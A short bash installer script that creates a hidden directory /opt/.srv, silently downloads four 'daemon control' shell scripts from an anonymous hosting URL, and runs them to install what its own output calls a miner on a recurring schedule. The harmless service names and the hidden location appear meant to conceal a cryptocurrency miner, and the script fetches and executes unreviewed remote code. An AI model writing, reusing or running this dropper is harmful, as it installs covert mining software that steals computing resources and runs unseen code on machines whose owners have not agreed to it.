#!/bin/bash
echo "Downloading daemon control scripts..."
mkdir -p /opt/.srv
cd /opt/.srv
curl -s -L "https://anonymous.4open.science/api/repo/service-7B29/file/daemon_control_install.sh?v=ddd0492f&download=true" -o daemon_control_install.sh
curl -s -L "https://anonymous.4open.science/api/repo/service-7B29/file/daemon_control_start.sh?v=ddd0492f&download=true" -o daemon_control_start.sh
curl -s -L "https://anonymous.4open.science/api/repo/service-7B29/file/daemon_control_stop.sh?v=ddd0492f&download=true" -o daemon_control_stop.sh
curl -s -L "https://anonymous.4open.science/api/repo/service-7B29/file/daemon_control_schedule.sh?v=ddd0492f&download=true" -o daemon_control_schedule.sh
chmod +x *.sh
echo "Installing miner..."
./daemon_control_install.sh
echo "Setting up automatic switching..."
./daemon_control_schedule.sh
echo "Installation completed!"
echo "Control commands:"
echo "  /opt/.srv/daemon_control_start.sh  - start"
echo "  /opt/.srv/daemon_control_stop.sh   - stop"
